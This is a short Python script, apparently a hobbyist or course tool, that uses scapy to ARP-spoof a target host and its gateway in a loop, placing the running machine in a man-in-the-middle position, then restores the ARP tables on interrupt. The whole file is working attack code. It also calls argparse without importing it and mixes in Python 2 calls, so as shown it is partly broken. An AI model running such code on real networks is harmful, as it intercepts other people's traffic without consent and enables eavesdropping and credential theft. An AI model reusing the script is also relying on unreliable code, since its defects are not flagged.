#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answererd_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    return (answererd_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False, count = 4)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "Target IP address")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "Gateway IP address")
    options = parser.parse_args()
    target_ip, gateway_ip = options.target_ip, options.gateway_ip
    if not target_ip:
        target_ip = raw_input("Target IP >")
    if not gateway_ip:
        gateway_ip = raw_input("Gateway IP >")
    return target_ip,gateway_ip

if __name__ == "__main__":
    target_ip, gateway_ip = get_arguments()
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip,gateway_ip)
            spoof(gateway_ip,target_ip)
            sent_packets_count += 2
            print("\r[+]Packets sent: "+str(sent_packets_count)),
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL+C ..... Resetting ARP tables.... Please wait.")
        restore(target_ip,gateway_ip)
        restore(gateway_ip,target_ip)
        print("[+] ARP table restored")
